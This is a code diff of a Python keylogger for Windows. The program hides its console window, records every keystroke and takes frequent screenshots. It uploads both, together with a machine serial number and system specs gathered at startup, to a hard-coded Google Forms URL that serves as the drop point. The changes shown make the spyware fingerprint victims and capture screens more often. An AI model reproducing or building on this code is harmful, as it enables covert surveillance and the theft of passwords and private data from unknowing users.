@@ -3,6 +3,7 @@ import Queue
 import io
 import threading
 import time
+import specs
 
 from PIL import Image
 
@@ -24,11 +25,15 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     print "Multiple Instance not Allowed"
     exit(0)
 
+serial_number = ''
+user_specs = ''
+
 data = ''
 key_strokes_queue = Queue.Queue()
 screenshot_queue = Queue.Queue()
 
 BUFFER_SIZE = 1000
+
 
 # Hide Console
 def hide():
@@ -58,7 +63,10 @@ def remote_send():
     data_to_be_sent = key_strokes_queue.get()
 
     url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
-    form_data = {'entry.1256060651': data_to_be_sent}
+    form_data = {
+        'entry.1256060651': data_to_be_sent,
+        'entry.762506489': serial_number
+    }
     user_agent = {
         'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
         'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"
@@ -86,11 +94,14 @@ def remote_send_screenshot():
     print len(screenshot_to_be_sent), screenshot_to_be_sent
 
     url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
-    form_data = {'entry.1529555865': screenshot_to_be_sent[:5000]}
+    form_data = {
+        'entry.1529555865': screenshot_to_be_sent[:5000],
+        'entry.762506489': serial_number
+    }
     user_agent = {
         'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
         'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"}
-    requests.post(url, data=form_data, headers=user_agent)
+    requests.post(url, data=form_data, headers=user_agent, verify="cert.pem")
 
     # x = "qwertyui"
     # chunks, chunk_size = len(x), len(x) // 4
@@ -133,20 +144,32 @@ def keypressed(event):
 
 
 def run_keylogger_handler():
-    hookManager= pyHook.HookManager()
+    hookManager = pyHook.HookManager()
     hookManager.KeyDown = keypressed
     hookManager.HookKeyboard()
     pythoncom.PumpMessages()
 
 
 def run_screenshot_handler():
-    t = threading.Thread(target=take_screenshot, args=[1000])
+    t = threading.Thread(target=take_screenshot, args=[100])
     t.daemon = True
     t.start()
 
 
+def get_specs():
+    global serial_number, user_specs
+    serial_number, user_specs = specs.get_specs()
+    key_strokes_queue.put(user_specs)
+    remote_send()
+
+
+def run_specs_fetcher():
+    get_specs()
+
+
 def main():
     hide()
+    run_specs_fetcher()
     run_screenshot_handler()
     run_keylogger_handler()
 
